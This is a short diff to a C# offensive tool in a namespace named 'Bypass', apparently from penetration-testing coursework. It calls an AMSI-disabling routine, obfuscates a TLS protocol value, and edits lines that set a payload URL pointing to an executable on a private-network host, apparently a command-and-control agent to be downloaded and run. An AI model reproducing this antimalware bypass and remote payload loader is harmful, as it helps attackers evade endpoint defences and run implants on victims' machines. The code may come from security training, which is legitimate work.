@@ -306,7 +306,7 @@ namespace Bypass
 
             PathAMSI();
 
-            //        string payloadPathOrUrl = "http://192.168.58.129:8081/apollo-local.exe";
+            //        string payloadPathOrUrl = "http://192.168.58.129:8081/apollo-osep.exe";
             //        string[] payloadArgs = new string[] { };
 
             //bool base64Enc = false;
@@ -315,7 +315,7 @@ namespace Bypass
 
             int secProTypeHolde = (Convert.ToInt32("384") * Convert.ToInt32("8"));
 
-            //	payloadPathOrUrl="http://192.168.58.129:8081/apollo-local.exe";
+            //	payloadPathOrUrl="http://192.168.58.129:8081/apollo-osep.exe";
 
 
             if (string.IsNullOrEmpty(payloadPathOrUrl))
